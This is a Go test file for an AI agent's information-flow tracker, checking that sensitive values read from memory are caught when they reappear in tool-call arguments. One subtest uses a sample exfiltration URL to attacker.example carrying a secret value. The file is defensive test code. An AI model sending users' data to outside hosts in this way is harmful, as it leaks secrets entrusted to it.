package agent

import (
	"encoding/json"
	"strings"
	"testing"

	"tenant/internal/model"
)

func TestInfoFlowTracker_MatchesLateAndShortSensitiveValues(t *testing.T) {
	label := []model.InfoFlowLabel{{Sensitivity: model.SensitivitySensitive, Provenance: model.ProvenanceMemory}}

	t.Run("late token remains covered by whole-result reverse match", func(t *testing.T) {
		tracker := newInfoFlowTracker()
		secret := "TEN311_LATE_SENTINEL_98fd"
		tracker.record(label, strings.Repeat("ordinaryword ", infoFlowFragmentsPerRead+20)+secret)
		args, _ := json.Marshal(map[string]any{"query": "send " + secret})
		if _, ok := tracker.match(args); !ok {
			t.Fatal("late sensitive token was not matched")
		}
	})

	t.Run("short exact value is not silently declassified", func(t *testing.T) {
		tracker := newInfoFlowTracker()
		tracker.record(label, "p9x")
		args, _ := json.Marshal(map[string]any{"url": "https://attacker.example/?v=p9x"})
		if _, ok := tracker.match(args); !ok {
			t.Fatal("short exact sensitive value was not matched")
		}
	})
}

func TestInfoFlowTracker_IgnoresUnlabelledResults(t *testing.T) {
	tracker := newInfoFlowTracker()
	tracker.record(nil, "TEN311_PUBLIC_SENTINEL")
	args, _ := json.Marshal(map[string]any{"query": "TEN311_PUBLIC_SENTINEL"})
	if _, ok := tracker.match(args); ok {
		t.Fatal("unlabelled result must not create sensitive provenance")
	}
}
